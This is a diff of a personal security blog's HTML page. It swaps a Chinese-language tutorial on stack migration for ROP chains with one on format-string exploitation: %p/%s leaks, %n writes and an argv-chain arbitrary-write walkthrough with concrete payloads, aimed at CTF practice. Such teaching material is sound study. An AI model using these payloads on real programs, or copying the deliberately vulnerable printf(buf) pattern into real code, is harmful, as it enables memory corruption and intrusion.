@@ -36,7 +36,7 @@
     
     
       
-        <title>Stack Migration - frozenkp's Blog</title>
+        <title>Format String - frozenkp's Blog</title>
       
     
     
@@ -89,7 +89,7 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="search" autocomplete="off">
     <label class="md-overlay" data-md-component="overlay" for="drawer"></label>
     
-      <a href="#stack-migration" tabindex="1" class="md-skip">
+      <a href="#format-string" tabindex="1" class="md-skip">
         Skip to content
       </a>
     
@@ -115,7 +115,7 @@
                 frozenkp's Blog
               </span>
               <span class="md-header-nav__topic">
-                Stack Migration
+                Format String
               </span>
             
           
@@ -791,6 +791,18 @@
           
           
 
+
+  <li class="md-nav__item">
+    <a href="../stack_migration/" title="Stack Migration" class="md-nav__link">
+      Stack Migration
+    </a>
+  </li>
+
+        
+          
+          
+          
+
   
 
 
@@ -802,11 +814,11 @@
     
     
       <label class="md-nav__link md-nav__link--active" for="toc">
-        Stack Migration
+        Format String
       </label>
     
-    <a href="./" title="Stack Migration" class="md-nav__link md-nav__link--active">
-      Stack Migration
+    <a href="./" title="Format String" class="md-nav__link md-nav__link--active">
+      Format String
     </a>
     
       
@@ -820,16 +832,16 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#leave" title="leave" class="md-nav__link">
-    leave
+  <a href="#printf" title="printf 參數" class="md-nav__link">
+    printf 參數
   </a>
   
     <nav class="md-nav">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#rbp" title="rbp" class="md-nav__link">
-    rbp
+  <a href="#_1" title="直接指定參數" class="md-nav__link">
+    直接指定參數
   </a>
   
 </li>
@@ -840,16 +852,23 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#simple-migration" title="Simple Migration" class="md-nav__link">
-    Simple Migration
+  <a href="#_2" title="讀取" class="md-nav__link">
+    讀取
   </a>
   
     <nav class="md-nav">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_1" title="流程" class="md-nav__link">
-    流程
+  <a href="#p" title="%p" class="md-nav__link">
+    %p
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#s" title="%s" class="md-nav__link">
+    %s
   </a>
   
 </li>
@@ -860,29 +879,84 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#fixed-size-migration" title="Fixed Size Migration" class="md-nav__link">
-    Fixed Size Migration
+  <a href="#_3" title="寫入" class="md-nav__link">
+    寫入
   </a>
   
     <nav class="md-nav">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#migration" title="第一次 migration" class="md-nav__link">
-    第一次 migration
+  <a href="#_4" title="寫入的值" class="md-nav__link">
+    寫入的值
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#migration-rop-chain" title="交替 migration 寫入 ROP chain" class="md-nav__link">
-    交替 migration 寫入 ROP chain
+  <a href="#_5" title="寫入的長度" class="md-nav__link">
+    寫入的長度
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#argv-chain" title="argv chain" class="md-nav__link">
+    argv chain
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#argv1-2-bytes" title="第一步：透過 argv1 寫 2 bytes" class="md-nav__link">
+    第一步：透過 argv1 寫 2 bytes
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#argv0-2" title="第二步：透過 argv0 移動 2" class="md-nav__link">
+    第二步：透過 argv0 移動 2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#argv1-2-bytes_1" title="第三步：透過 argv1 寫 2 bytes" class="md-nav__link">
+    第三步：透過 argv1 寫 2 bytes
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#argv0" title="第四步：透過 argv0 移動回來" class="md-nav__link">
+    第四步：透過 argv0 移動回來
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#argv2-0xdeadbeef" title="第五步：透過 argv2 寫入 0xdeadbeef" class="md-nav__link">
+    第五步：透過 argv2 寫入 0xdeadbeef
   </a>
   
 </li>
         
       </ul>
     </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_printf_chk" title="_printf_chk" class="md-nav__link">
+    _printf_chk
+  </a>
   
 </li>
       
@@ -894,18 +968,6 @@
   
 </nav>
     
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../format_string/" title="Format String" class="md-nav__link">
-      Format String
-    </a>
   </li>
 
         
@@ -971,16 +1033,16 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#leave" title="leave" class="md-nav__link">
-    leave
+  <a href="#printf" title="printf 參數" class="md-nav__link">
+    printf 參數
   </a>
   
     <nav class="md-nav">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#rbp" title="rbp" class="md-nav__link">
-    rbp
+  <a href="#_1" title="直接指定參數" class="md-nav__link">
+    直接指定參數
   </a>
   
 </li>
@@ -991,16 +1053,23 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#simple-migration" title="Simple Migration" class="md-nav__link">
-    Simple Migration
+  <a href="#_2" title="讀取" class="md-nav__link">
+    讀取
   </a>
   
     <nav class="md-nav">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_1" title="流程" class="md-nav__link">
-    流程
+  <a href="#p" title="%p" class="md-nav__link">
+    %p
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#s" title="%s" class="md-nav__link">
+    %s
   </a>
   
 </li>
@@ -1011,29 +1080,84 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#fixed-size-migration" title="Fixed Size Migration" class="md-nav__link">
-    Fixed Size Migration
+  <a href="#_3" title="寫入" class="md-nav__link">
+    寫入
   </a>
   
     <nav class="md-nav">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#migration" title="第一次 migration" class="md-nav__link">
-    第一次 migration
+  <a href="#_4" title="寫入的值" class="md-nav__link">
+    寫入的值
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#migration-rop-chain" title="交替 migration 寫入 ROP chain" class="md-nav__link">
-    交替 migration 寫入 ROP chain
+  <a href="#_5" title="寫入的長度" class="md-nav__link">
+    寫入的長度
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#argv-chain" title="argv chain" class="md-nav__link">
+    argv chain
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#argv1-2-bytes" title="第一步：透過 argv1 寫 2 bytes" class="md-nav__link">
+    第一步：透過 argv1 寫 2 bytes
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#argv0-2" title="第二步：透過 argv0 移動 2" class="md-nav__link">
+    第二步：透過 argv0 移動 2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#argv1-2-bytes_1" title="第三步：透過 argv1 寫 2 bytes" class="md-nav__link">
+    第三步：透過 argv1 寫 2 bytes
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#argv0" title="第四步：透過 argv0 移動回來" class="md-nav__link">
+    第四步：透過 argv0 移動回來
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#argv2-0xdeadbeef" title="第五步：透過 argv2 寫入 0xdeadbeef" class="md-nav__link">
+    第五步：透過 argv2 寫入 0xdeadbeef
   </a>
   
 </li>
         
       </ul>
     </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_printf_chk" title="_printf_chk" class="md-nav__link">
+    _printf_chk
+  </a>
   
 </li>
       
@@ -1053,98 +1177,245 @@
             <article class="md-content__inner md-typeset">
               
                 
-                  <a href="https://github.com/frozenkp/frozenkp.github.io/edit/master/docs/pwn/stack_migration.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
+                  <a href="https://github.com/frozenkp/frozenkp.github.io/edit/master/docs/pwn/format_string.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                 
                 
-                <h1 id="stack-migration">Stack Migration</h1>
-<p>stack migration 是在可以輸入的 ROPchain 長度不夠時，可以擴展輸入的方法</p>
-<p>核心概念是將 ROPchain 分好幾次寫在指定的區域，最後再將 stack 移動過去執行</p>
-<h2 id="leave">leave</h2>
-<p><code>leave</code> 是 stack migration 的關鍵，實際上 <code>leave</code> 做了兩個動作</p>
-<div class="highlight"><pre><span></span>mov rsp, rbp
-pop rbp
+                <h1 id="format-string">Format String</h1>
+<p>format string 是在使用 printf 上的一個漏洞，基本上好像只會在打題目的時候出現 XD</p>
+<p>以下是經典的 format string 範例</p>
+<div class="highlight"><pre><span></span><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
+<span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
 </pre></div>
 
-<p>而每次進行 buffer overflow 時，<code>rbp</code> 是可控的，在下一輪時也可以進一步控制 <code>rsp</code></p>
-<h3 id="rbp">rbp</h3>
-<p>buffer overflow 以後，stack 上的情況如下</p>
-<p>在不用 stack migration 的時候，rbp 就隨便填就好了，反正之後不會用到，但要使用 stack migration 時，就必須先把 rbp 指定到特定的 buffer ，之後才能移動 stack</p>
-<div class="highlight"><pre><span></span>rsp             AAAAAAAA
-rsp + 8         AAAAAAAA
-rsp + 16        AAAAAAAA
-...             ...
-rbp             buffer      ＃ 這裡是原本的 rbp 指定的位置，就是 mov 後 stack 的最上層
-ret             ROP gadget
+<p>原本應該由開發者填寫的 format 變成使用者可控的，可以藉由這樣的漏洞達到任意讀取及任意寫入的操作</p>
+<h2 id="printf">printf 參數</h2>
+<p>一開始要先講的是 <code>printf</code> 的參數，在 <code>amd64</code> 的情況下，如果參數沒有超過 6 個的話會放在 register 上，第 7 個開始才放在 stack 上</p>
+<p><code>rdi</code>→<code>rsi</code> → <code>rdx</code> → <code>rcx</code> → <code>r8</code> → <code>r9</code> → <code>stack</code></p>
+<p>正常使用 <code>printf</code> 時：</p>
+<div class="highlight"><pre><span></span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d%c%s&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span>  <span class="n">b</span><span class="p">,</span>  <span class="n">c</span><span class="p">);</span>
+          <span class="o">|</span>      <span class="o">|</span>   <span class="o">|</span>   <span class="o">|</span>
+         <span class="n">rdi</span>    <span class="n">rsi</span> <span class="n">rdx</span> <span class="n">rcx</span>
 </pre></div>
 
-<p>接著在下一次遇到 <code>leave</code> 時，<code>mov rsp, rbp</code> 就會將 stack 改到 buffer 上了</p>
-<h2 id="simple-migration">Simple Migration</h2>
-<p>在可以控制輸入長度時，可以一口氣將要用到的 gadgets 都寫上 buffer 並將 stack 移動過去執行，具體操作如下：</p>
-<div class="highlight"><pre><span></span>payload + buf + set_input_parameters + input_func + leave_ret 
-           |        |                                  |
-           |        +----------------------------------+
-          rbp                    ROP chain
+<p>在使用 fromat string 時，<code>rdi</code> 是自己的 payload，而第一個 <code>%</code> 代表的是 <code>rsi</code>，如果想要動到 stack 上的東西就要從第 6 個 <code>%</code> 開始</p>
+<h3 id="_1">直接指定參數</h3>
+<p>可以使用 <code>%x$y</code> 直接指定第幾個參數，這邊的 <code>x</code> 是第幾個參數，<code>y</code> 則是要使用的方法</p>
+<div class="highlight"><pre><span></span><span class="o">%</span><span class="mi">2</span><span class="err">$</span><span class="n">p</span>          <span class="c1">// 印出 rdx (第 2 個參數)</span>
+<span class="o">%</span><span class="mi">3</span><span class="err">$</span><span class="n">n</span>          <span class="c1">// 寫入 rcx (第 3 個參數)</span>
 </pre></div>
 
-<p>這邊要注意的是，input 要指定到 buf 上，且第一個必須要輸入 rbp，如果沒有要執行第二次的 migration 的話，就隨便填就好了</p>
-<div class="highlight"><pre><span></span>buf2 + rop_chain + [set_input_parameters + input_func + leave_ret]
+<h2 id="_2">讀取</h2>
+<p>讀取的部分主要可以有 <code>%p</code> 以及 <code>%s</code> 兩種做法，<code>%p</code> 可以用來讀取 register 以及 stack 上的值，而 <code>%s</code> 則可以做到任意讀取</p>
+<h3 id="p">%p</h3>
+<p>在讀取時使用的是 <code>%p</code> ，可以用 16 進位印出某個 register (stack 某位置) 存的值，以下來個範例</p>
+<p><img alt="" src="https://i.imgur.com/COSz0S8.png" /></p>
+<p>這邊輸入的 payload 是</p>
+<div class="highlight"><pre><span></span>%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
 </pre></div>
 
-<h3 id="_1">流程</h3>
-<ol>
-<li>leave：把 <code>rbp</code> 設定成 <code>buf</code></li>
-<li>執行 input_func 並將輸入讀取到 <code>buf</code><ul>
-<li>輸入新的 rbp 以及 ROP chain</li>
+<p>輸出如下</p>
+<div class="highlight"><pre><span></span>0x1,0x7ffff7dd3790,0xa,(nil),0x7ffff7fe9700,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x400070,0x7fffffffe940,0x7b74f8be5cadfe00,0x4006f0
+ |         |        |    |         |               |                   |                   |                 |      
+rsi       rdx      rcx  r8        r9              rsp              rsp + 0x8           rsp + 0x10        rsp + 0x18
+</pre></div>
+
+<p>假設想要印出 <code>rsp + 0x28</code> 的值也可以直接使用 <code>$</code> 來指定</p>
+<div class="highlight"><pre><span></span>%10$p -&gt; 0x400070
+</pre></div>
+
+<h3 id="s">%s</h3>
+<p><code>%s</code> 跟 <code>%p</code> 讀取的目標不一樣，<code>%s</code> 是把存的值當成指標去讀取，而 <code>%p</code> 是把存的值直接送出來</p>
+<p>在正常使用 <code>%s</code> 時，放入的參數是某個字串的指標，<code>printf</code> 會把指標所指的地方當成字串印出</p>
+<div class="highlight"><pre><span></span><span class="kt">char</span> <span class="n">str</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;Hello World!&quot;</span><span class="p">;</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>               <span class="c1">// Hello World!</span>
+</pre></div>
+
+<p>這種機制就可以用來任意讀取，假設輸入的 payload 在 stack 上的話，可以把想要印出的位址寫在 payload 上，接著使用 <code>%s</code> 去讀出來，以下是範例</p>
+<p><img alt="" src="https://i.imgur.com/5Kp4CMK.png" /></p>
+<p>這時候的輸入如下，<code>aaaa</code> 的部分是為了把要印的位址推到 <code>rsp + 0x8</code> ，這樣 <code>rsp + 0x8</code> 就會剛好是 <code>0x6262626262626262</code> ("bbbbbbbb")</p>
+<div class="highlight"><pre><span></span>%7$saaaabbbbbbbb
+</pre></div>
+
+<p>在執行 <code>printf</code> 時會去抓 <code>0x6262626262626262</code> 所存的值並當成字串印出，不過這次的範例沒有這個位址，所以會失敗</p>
+<h2 id="_3">寫入</h2>
+<p><code>printf</code> 使用 <code>%n</code> 時可以寫入指定的位置，也可以更近一步使用 argv chain 來達成任意位址寫入</p>
+<p><code>%n</code> 跟 <code>%s</code> 類似，一樣是把存的值當成指標，<code>%s</code> 將指標指的位置讀出來，而 <code>%n</code> 則是把數值寫入指標所指的位置</p>
+<p>假設 stack 上的 <code>rsp + 0x10</code> 如下，用 <code>%8$n</code> 寫入這格時，實際上會寫到 <code>0x7ffff7fea000</code> </p>
+<div class="highlight"><pre><span></span><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7ffff7a0d000 --&gt; 0x3010102464c457f
+</pre></div>
+
+<p>如果是寫 <code>0xdeadbeef</code> 的話，這段就會變成</p>
+<div class="highlight"><pre><span></span>0016| 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7fffdeadbeef
+</pre></div>
+
+<h3 id="_4">寫入的值</h3>
+<p>寫入的值是在遇到 <code>%n</code> 前總共印了幾個字元</p>
+<p>例如 payload 如下，<code>%n</code> 前有 8 個 <code>a</code> ，所以會寫 8 到指定的位置</p>
+<div class="highlight"><pre><span></span>aaaaaaaa%n
+</pre></div>
+
+<p>如果有多個 <code>%n</code> 的話就要看前面到底多長</p>
+<p>例如 payload 如下，第一個 <code>%n</code> 前有 8 個 <code>a</code> ，會寫 8 到 <code>rsp</code> 指的位置，而第二個 <code>%n</code> 前有 8 個 <code>a</code> 以及 8 個 <code>b</code> ，共 16 字元，所以會寫 16 到 <code>rsp + 8</code> 所指的位置</p>
+<div class="highlight"><pre><span></span>aaaaaaaa%6$nbbbbbbbb%7$n
+</pre></div>
+
+<p>不過這樣寫入要打很久，這時候可以用到 <code>%c</code> 來構成 payload</p>
+<p>先來看看 <code>%c</code> 的用法，可以直接指定要印出的長度</p>
+<div class="highlight"><pre><span></span><span class="c1">// input</span>
+<span class="kt">char</span> <span class="n">ch</span> <span class="o">=</span> <span class="sc">&#39;a&#39;</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">&quot;%3c&quot;</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">&quot;%5c&quot;</span><span class="p">);</span>
+<span class="c1">// output</span>
+<span class="s">&quot;  a&quot;</span>
+<span class="s">&quot;    a&quot;</span>
+</pre></div>
+
+<p>利用 <code>%c</code> 修改一下上面的範例，可以達成一樣的效果</p>
+<div class="highlight"><pre><span></span>%8c%6$n%8c%7$n
+</pre></div>
+
+<h3 id="_5">寫入的長度</h3>
+<p>上面雖然都用 <code>%n</code> 來舉例，但其實寫入可以指定不同的長度</p>
+<table>
+<thead>
+<tr>
+<th align="center">格式</th>
+<th align="center">長度 (byte)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">%lln</td>
+<td align="center">8 bytes</td>
+</tr>
+<tr>
+<td align="center">%n</td>
+<td align="center">4 bytes</td>
+</tr>
+<tr>
+<td align="center">%hn</td>
+<td align="center">2 bytes</td>
+</tr>
+<tr>
+<td align="center">%hhn</td>
+<td align="center">1 byte</td>
+</tr>
+</tbody>
+</table>
+<p>以一開始的例子來說</p>
+<div class="highlight"><pre><span></span><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7ffff7a0d000 --&gt; 0x3010102464c457f
+</pre></div>
+
+<p>寫 <code>aaaa%8$lln</code> </p>
+<div class="highlight"><pre><span></span><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x4
+</pre></div>
+
+<p>寫 <code>aaaa%8$n</code></p>
+<div class="highlight"><pre><span></span><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7fff00000004
+</pre></div>
+
+<p>寫 <code>aaaa%8$hn</code></p>
+<div class="highlight"><pre><span></span><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7ffff7a00004
+</pre></div>
+
+<p>寫 <code>aaaa%8$hhn</code></p>
+<div class="highlight"><pre><span></span><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7ffff7a0d004
+</pre></div>
+
+<p>一般在使用的時候，通常不會一次寫入整段的資料，例如要寫入 <code>0xdeadbeef</code> 的話，就必須要一次寫 3735928559 個字元，需要跑超久的，因此會配合 argv chain 分成 <code>0xde</code>、<code>0xad</code>、<code>0xbe</code>、<code>0xef</code> 來多次寫入</p>
+<h3 id="argv-chain">argv chain</h3>
+<p>argv chain 是利用 stack 上的 argv 來達成任意寫入的功能</p>
+<p>stack 上都會有一段是 argv 的位置，argv chain 上的兩段位址都在 stack 上且可以控制</p>
+<div class="highlight"><pre><span></span><span class="m">0000</span><span class="p">|</span> 0x7fffffffe820 --&gt; 0x333231 <span class="o">(</span><span class="s1">&#39;123&#39;</span><span class="o">)</span>
+<span class="m">0008</span><span class="p">|</span> 0x7fffffffe828 --&gt; 0x40073d <span class="o">(</span>&lt;__libc_csu_init+77&gt;:    add    rbx,0x1<span class="o">)</span>
+<span class="m">0016</span><span class="p">|</span> 0x7fffffffe830 --&gt; 0x0
+<span class="m">0024</span><span class="p">|</span> 0x7fffffffe838 --&gt; 0x0
+<span class="m">0032</span><span class="p">|</span> 0x7fffffffe840 --&gt; 0x4006f0 <span class="o">(</span>&lt;__libc_csu_init&gt;:   push   r15<span class="o">)</span>
+<span class="m">0040</span><span class="p">|</span> 0x7fffffffe848 --&gt; 0x400590 <span class="o">(</span>&lt;_start&gt;:    xor    ebp,ebp<span class="o">)</span>
+<span class="m">0048</span><span class="p">|</span> 0x7fffffffe850 --&gt; 0x7fffffffe940 --&gt; 0x1
+<span class="m">0056</span><span class="p">|</span> 0x7fffffffe858 --&gt; 0xa0a688c62ba6ff00
+<span class="m">0064</span><span class="p">|</span> 0x7fffffffe860 --&gt; 0x4006f0 <span class="o">(</span>&lt;__libc_csu_init&gt;:   push   r15<span class="o">)</span>
+<span class="m">0072</span><span class="p">|</span> 0x7fffffffe868 --&gt; 0x7ffff7a2d830 <span class="o">(</span>&lt;__libc_start_main+240&gt;:   mov    edi,eax<span class="o">)</span>
+<span class="m">0080</span><span class="p">|</span> 0x7fffffffe870 --&gt; 0x0
++------------------------------------------------------------------------------------------------------------------------------------------+
+<span class="p">|</span><span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80   <span class="o">(</span><span class="s2">&quot;/home/frozenkp/challenge/format/a.out&quot;</span><span class="o">)</span>        <span class="p">|</span>
++------------------------------------------------------------------------------------------------------------------------------------------+
+<span class="m">0096</span><span class="p">|</span> 0x7fffffffe880 --&gt; 0x1f7ffcca0
+<span class="m">0104</span><span class="p">|</span> 0x7fffffffe888 --&gt; 0x400686 <span class="o">(</span>&lt;main&gt;:  push   rbp<span class="o">)</span>
+<span class="m">0112</span><span class="p">|</span> 0x7fffffffe890 --&gt; 0x0
+<span class="m">0120</span><span class="p">|</span> 0x7fffffffe898 --&gt; 0xc5142c5f7392e1ee
+</pre></div>
+
+<div class="highlight"><pre><span></span><span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; 0x72662f656d6f682f
+              <span class="p">|</span>                  <span class="p">|</span>                  <span class="p">|</span>
+          rsp + 0x58         rsp + 0x128        rsp + 0x360
+            argv0              argv1              argv2
+</pre></div>
+
+<p>可以透過寫入 argv1 來改動 argv2 寫的內容 (address)，最後再透過寫入 argv2 來寫入指定的位址</p>
+<p>以下範例，假設要在 <code>0xdeadbeef</code> 寫入 <code>0x4</code></p>
+<h4 id="argv1-2-bytes">第一步：透過 argv1 寫 2 bytes</h4>
+<p>一開始先在 argv2 的值寫上 <code>0xef</code> ，payload 如下</p>
+<div class="highlight"><pre><span></span>%48879c%43$hn
+</pre></div>
+
+<p>寫完後如下</p>
+<div class="highlight"><pre><span></span>                                                                             +----+
+<span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; 0x72662f656d6f<span class="p">|</span>beef<span class="p">|</span>
+                                                                             +----+
+</pre></div>
+
+<h4 id="argv0-2">第二步：透過 argv0 移動 2</h4>
+<p>把 argv2 移動 2，payload 如下</p>
+<div class="highlight"><pre><span></span>%2c%17$hhn
+</pre></div>
+
+<p>寫完後如下，argv2 從 <code>0x7fffffffeb80</code> 變成 <code>0x7fffffffeb82</code></p>
+<div class="highlight"><pre><span></span><span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb82 --&gt; 0x7a6f72662f656d6f
+</pre></div>
+
+<h4 id="argv1-2-bytes_1">第三步：透過 argv1 寫 2 bytes</h4>
+<p>原本只能寫上 <code>0xbeef</code> ，後面的部分透過第二步移動 argv2 以後就可以用 <code>%hn</code> 碰到了</p>
+<p>因為剩下只要寫掉 <code>0xdead</code> 就好，所以我這邊直接使用 <code>%lln</code> 把後面都用 0 蓋掉</p>
+<div class="highlight"><pre><span></span>%57005c%43$lln
+</pre></div>
+
+<p>寫完後如下</p>
+<div class="highlight"><pre><span></span>                                                               +------+
+<span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb82 --&gt; <span class="p">|</span>0xdead<span class="p">|</span>
+                                                               +------+
+</pre></div>
+
+<h4 id="argv0">第四步：透過 argv0 移動回來</h4>
+<p>把 argv2 移動回來，payload 如下</p>
+<div class="highlight"><pre><span></span>%17$hhn
+</pre></div>
+
+<p>寫完後如下，分兩段寫後就可以把整個 <code>0xdeadbeef</code> 寫上去了</p>
+<div class="highlight"><pre><span></span>                                                               +----------+
+<span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; <span class="p">|</span>0xdeadbeef<span class="p">|</span>
+                                                               +----------+
+</pre></div>
+
+<h4 id="argv2-0xdeadbeef">第五步：透過 argv2 寫入 0xdeadbeef</h4>
+<p>這邊再寫入的時候，如果要寫得值太大，一樣要像前面一樣分成多段來寫，而這個範例只要寫入 <code>0x4</code> 所以就直接寫就好了</p>
+<div class="highlight"><pre><span></span>%4c%114$lln
+</pre></div>
+
+<p>寫完後，<code>0xdeadbeef</code> 存的值就會被改掉了</p>
+<div class="highlight"><pre><span></span><span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; 0xdeadbeef --&gt; 0x4
+</pre></div>
+
+<blockquote>
+<p>這題範例為了講解方便，所以一次都寫 2 bytes，建議是一次寫 1 byte 用 for 迴圈自動移動完成即可</p>
+</blockquote>
+<h2 id="_printf_chk">_printf_chk</h2>
+<p>有時候會遇到使用的是 <code>_printf_chk</code> 而非 <code>printf</code>，其實這兩個差不多，只不過 <code>_printf_chk</code> 多了以下限制</p>
+<ul>
+<li>不能用 <code>%n</code> 系列寫值</li>
+<li>不能用 <code>%x$y</code> 指定參數</li>
 </ul>
-</li>
-<li>leave：stack 跳轉到 <code>buf</code> 並將 <code>rbp</code> 設成 <code>buf2</code> </li>
-<li>執行 ROP chain</li>
-<li>是否執行下一次 migration<ul>
-<li>是：跳回 2 (<code>buf</code> 和 <code>buf2</code> 對調，多次 migration 就在 <code>buf</code> 和 <code>buf2</code> 互換即可)</li>
-<li>否：結束</li>
-</ul>
-</li>
-</ol>
-<h2 id="fixed-size-migration">Fixed Size Migration</h2>
-<p>在不能控制輸入長度時，就只能使用原本的 <code>read</code> 來多次輸入 ROP chain</p>
-<p>架設有一個 <code>read</code> 如下，只能夠輸入一個 Gadget</p>
-<div class="highlight"><pre><span></span>payload (4 bytes) + rbp + ret
-</pre></div>
-
-<p>這時候就只能 return 到原本的 <code>read</code> (以下稱 <code>main_read</code>)</p>
-<p>仔細觀察一下會發現 <code>main_read</code> 其實會將輸入存到 <code>rbp - 0x20</code>，可以利用這個特性來寫入 ROP chain</p>
-<h3 id="migration">第一次 migration</h3>
-<p>第一次只是為了將 stack 移動到 buf 上而已</p>
-<div class="highlight"><pre><span></span>payload (4 bytes) + buf1 + main_read
-</pre></div>
-
-<ol>
-<li>leave：把 <code>rbp</code> 設定成 <code>buf1</code></li>
-<li>回到 <code>main_read</code> 讀取輸入，讀取到 <code>buf1 - 0x20</code> </li>
-<li>leave：把 <code>rsp</code> 設定成 <code>buf1</code> ，<code>rbp</code> 設定成 <code>buf1</code> 上寫的新 <code>rbp</code></li>
-</ol>
-<h3 id="migration-rop-chain">交替 migration 寫入 ROP chain</h3>
-<p>一開始是先送第一次 migration 的輸入</p>
-<div class="highlight"><pre><span></span>payload (4 bytes) + buf2 + main_read
-      ｜              |
-  rbp - 0x20         rbp
-</pre></div>
-
-<p>前面 4 bytes 就隨便放就好了，接著將 <code>rbp</code> 設成 <code>buf2</code> ，然後回到 <code>main_read</code></p>
-<p>第二次執行 <code>main_read</code> 時，會把輸入寫到 <code>buf2 - 0x20</code>，這時後輸入：</p>
-<div class="highlight"><pre><span></span>data (4 bytes) + buf1 + main_read
-   ｜              |
-buf2 - 0x20     rbp(buf2)
-</pre></div>
-
-<p>這樣輸入以後，就可以把 4 bytes 的 ROP chain 寫入 <code>buf2 - 0x20</code> ，然後再跳回 <code>buf1</code> </p>
-<p>接著就重複執行以上兩步就可以了，需要注意的是，如果每次都是給 <code>buf2</code> 會一直覆蓋掉，所以要一直更新位置</p>
-<div class="highlight"><pre><span></span>+-------------+------+-------------+-------------+--------------+
-| buf2 - 0x20 | buf2 | buf2 + 0x20 | buf2 + 0x40 |     ...      |
-+-------------+------+-------------+-------------+--------------+
-       |         |          |             |
-      1st       2nd        3rd           4th  
-</pre></div>
                 
                   
                 
@@ -1165,7 +1436,7 @@ buf2 - 0x20     rbp(buf2)
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid">
         
-          <a href="../radare2/" title="radare2" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../stack_migration/" title="Stack Migration" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-flex__cell md-flex__cell--shrink">
               <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
             </div>
@@ -1174,19 +1445,19 @@ buf2 - 0x20     rbp(buf2)
                 <span class="md-footer-nav__direction">
